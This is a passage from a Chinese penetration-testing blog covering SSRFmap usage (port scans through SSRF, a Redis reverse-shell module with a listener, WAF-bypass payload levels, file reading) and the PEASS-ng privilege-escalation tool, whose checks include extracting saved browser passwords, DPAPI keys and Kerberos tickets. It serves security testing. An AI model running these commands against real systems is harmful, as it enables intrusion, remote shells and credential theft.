<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Launch a portscan against an HTTPS endpoint using a custom user-agent</span><br><span class="line">python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent &quot;SSRFmapAgent&quot;</span><br></pre></td></tr></table></figure>



<p>有些模块允许您创建回连，您必须指定 LHOST 和 LPORT。SSRFmap 还可以侦听传入的反向 shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Triggering a reverse shell on a Redis</span><br><span class="line">python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242</span><br><span class="line"></span><br><span class="line"># -l create a listener for reverse shell on the specified port</span><br><span class="line"># --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload</span><br></pre></td></tr></table></figure>



<p>当目标受 WAF 或某些过滤器保护时，您可以尝试使用参数的各种有效负载和编码<code>--level</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># --level : ability to tweak payloads in order to bypass some IDS/WAF. e.g: 127.0.0.1 -&gt; [::] -&gt; 0000: -&gt; ...</span><br></pre></td></tr></table></figure>



<h2 id="SSRFmap-测试"><a href="#SSRFmap-测试" class="headerlink" title="SSRFmap 测试"></a>SSRFmap 测试</h2><p>可以使用 SSRF 服务来快速测试框架<code>data/example.py</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLASK_APP=data/example.py flask run &amp;</span><br><span class="line">python ssrfmap.py -r data/request.txt -p url -m readfiles</span><br></pre></td></tr></table></figure>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/%E5%85%A8%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7/">
                全系统提权工具
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="PEASS-ng-全自动提权工具"><a href="#PEASS-ng-全自动提权工具" class="headerlink" title="PEASS-ng-全自动提权工具"></a>PEASS-ng-全自动提权工具</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1-简介"></a>1-简介</h2><p><img src="https://pic.imgdb.cn/item/65f565eb9f345e8d03b55cf4.png" alt="img"></p>
<p>一款支持Linux-Windows-MacOS的自动提权工具.直接运行即可.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">按下Win+R，运行netplwiz，查看您的账户</span><br></pre></td></tr></table></figure>



<h2 id="2-github链接"><a href="#2-github链接" class="headerlink" title="2-github链接"></a>2-github链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng</span><br></pre></td></tr></table></figure>



<h2 id="3-github下载链接"><a href="#3-github下载链接" class="headerlink" title="3-github下载链接"></a>3-github下载链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng/releases/tag/20240310-532aceca</span><br></pre></td></tr></table></figure>

<h2 id="4-使用方式"><a href="#4-使用方式" class="headerlink" title="4-使用方式"></a>4-使用方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Windows下</span><br><span class="line">最好使用pwershell运行即可</span><br><span class="line">#Linux下</span><br><span class="line">直接运行</span><br><span class="line">#MacOS下,自行测试</span><br></pre></td></tr></table></figure>

<h2 id="5-扫描哪些信息"><a href="#5-扫描哪些信息" class="headerlink" title="5-扫描哪些信息"></a>5-扫描哪些信息</h2><h4 id="能检查哪些信息"><a href="#能检查哪些信息" class="headerlink" title="能检查哪些信息:"></a>能检查哪些信息:</h4><ul>
<li>系统信息<ul>
<li>基本系统信息</li>
<li>使用 Watson 搜索漏洞</li>
<li>枚举 Microsoft 更新信息</li>
<li>PS、审计、WEF 和 LAPS 设置</li>
<li>LSA 保护</li>
<li>凭据保护</li>
<li>WDigest</li>
<li>缓存的信用数量</li>
<li>环境变量</li>
<li>互联网设置</li>
<li>当前驱动器信息</li>
<li>杀毒软件</li>
<li>Windows Defender</li>
<li>UAC 配置</li>
<li>NTLM 设置</li>
<li>本地组策略</li>
<li>Applocker 配置和绕过建议</li>
<li>打印机</li>
<li>命名管道</li>
<li>AMSI 供应商</li>
<li>系统监视器</li>
<li>.NET 版本</li>
</ul>
</li>
<li>用户信息<ul>
<li>用户信息</li>
<li>当前令牌特权</li>
<li>剪贴板文本</li>
<li>当前登录的用户</li>
<li>RDP 会话</li>
<li>曾经登录过的用户</li>
<li>自动登录凭据</li>
<li>主文件夹</li>
<li>密码策略</li>
<li>本地用户详细信息</li>
<li>登录会话</li>
</ul>
</li>
<li>进程信息<ul>
<li>有趣的进程（非微软）</li>
</ul>
</li>
<li>服务信息<ul>
<li>有趣的服务（非 Microsoft）信息</li>
<li>可修改的服务</li>
<li>可写服务注册表binpath</li>
<li>PATH DLL劫持</li>
</ul>
</li>
<li>应用信息<ul>
<li>当前活动窗口</li>
<li>安装的软件</li>
<li>自动运行</li>
<li>计划任务</li>
<li>设备驱动程序</li>
</ul>
</li>
<li>网络信息<ul>
<li>当前net share</li>
<li>映射驱动器 (WMI)</li>
<li>主机文件</li>
<li>网络接口</li>
<li>监听端口</li>
<li>防火墙规则</li>
<li>DNS 缓存（限制 70）</li>
<li>互联网设置</li>
</ul>
</li>
<li>Windows 凭据<ul>
<li>Windows 保险库</li>
<li>凭证管理器</li>
<li>保存的 RDP 设置</li>
<li>最近运行的命令</li>
<li>默认 PS 成绩单文件</li>
<li>DPAPI 万能密钥</li>
<li>DPAPI 凭据文件</li>
<li>远程桌面连接管理器凭据</li>
<li>Kerberos 门票</li>
<li>无线上网</li>
<li>AppCmd.exe</li>
<li>SSClient.exe</li>
<li>SCCM</li>
<li>安全包凭证</li>
<li>AlwaysInstallElevated</li>
<li>WSUS</li>
</ul>
</li>
<li>浏览器信息<ul>
<li>Firefox 数据库</li>
<li>Firefox 历史上的凭据</li>
<li>Chrome 数据库</li>
<li>chrome 历史上的凭据</li>
<li>当前的 IE 选项卡</li>
<li>IE历史上的凭据</li>
<li>IE 收藏夹</li>
<li><strong>提取已保存的密码：Firefox、Chrome、Opera、Brave</strong></li>
</ul>
</li>
<li>有趣的文件和注册表<ul>
<li>Putty会话</li>
<li>Putty SSH 主机密钥</li>
<li>SuperPutty信息</li>
<li>OneDrive 同步的 Office365 端点</li>
<li>注册表中的 SSH 密钥</li>
<li>云凭证</li>
<li>检查无人参与的文件</li>
<li>检查 SAM 和 SYSTEM 备份</li>
<li>检查缓存的 GPP 密码</li>
<li>从 McAffe SiteList.xml 文件中检查并提取凭据</li>
<li>可能的具有凭据的注册表</li>
<li>用户家中可能的凭据文件</li>
<li><strong>回收站中可能存在的密码文件</strong></li>
<li>可能包含凭据的文件（这需要几分钟）</li>
<li>用户文件（限制 100 个）</li>
<li>Oracle SQL Developer 配置文件检查</li>
<li>Slack文件搜索</li>
<li>Outlook 下载</li>
<li>机器和用户证书文件</li>
<li>Office最近的文件</li>
<li>隐藏的文件和文件夹</li>
<li>具有写入权限的非默认文件夹中的可执行文件</li>
<li>WSL 检查</li>
</ul>
</li>
<li>活动信息<ul>
<li>登录 + 显式登录事件</li>
<li>流程创建事件</li>
<li>PowerShell 事件</li>
<li>电源开&#x2F;关事件</li>
</ul>
</li>
<li>附加（较慢）检查<ul>
<li>LOLBAS 搜索</li>
<li>在默认 WSL 分发中运行**[linpeas.sh](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-sc">https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-sc</a></li>
</ul>
</li>
</ul>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/3/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                     渗 透 测 试 ， 让 漏 洞 无 所 遁 形 ！ 电 子 取 证 ， 让 证 据 诉 说 答 案 ！ 占 卜 术 ， 一 起 揭 示 宇 宙 奥 秘 ！ 
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2025/01/18/APKDeeplens-%E8%87%AA%E5%8A%A8%E5%AF%B9APK%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0-%E9%A1%BA%E4%BE%BF%E5%87%BA%E4%B8%AA%E6%8A%A5%E5%91%8A/">APKDeeplens-自动对APK进行安全评估-</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2025/01/18/apk2url-%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8F%96apk%E4%B8%AD%E7%9A%84ip%E5%92%8C%E5%9F%9F%E5%90%8D%E5%B7%A5%E5%85%B7/">apk2url-自动提取apk中的ip和域名工具</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2025/01/18/X-Recon-XSS%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/">X-Recon-XSS漏洞扫描器</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2025/01/18/dirmap-%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8/">dirmap-路径扫描神器</a>
            </li>
            
        </ul>
    </div>



            
<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
    <h2>Categories</h2>
    <ul>
        
        <li>
            <a class="footer-post" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
        </li>
        
    </ul>
</div>

        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/Sgyling/Hack-tools">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://t.me/time_766">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:sgyling@gmail.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    这里要填写备案信息,但...但...但是我忘啦~
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>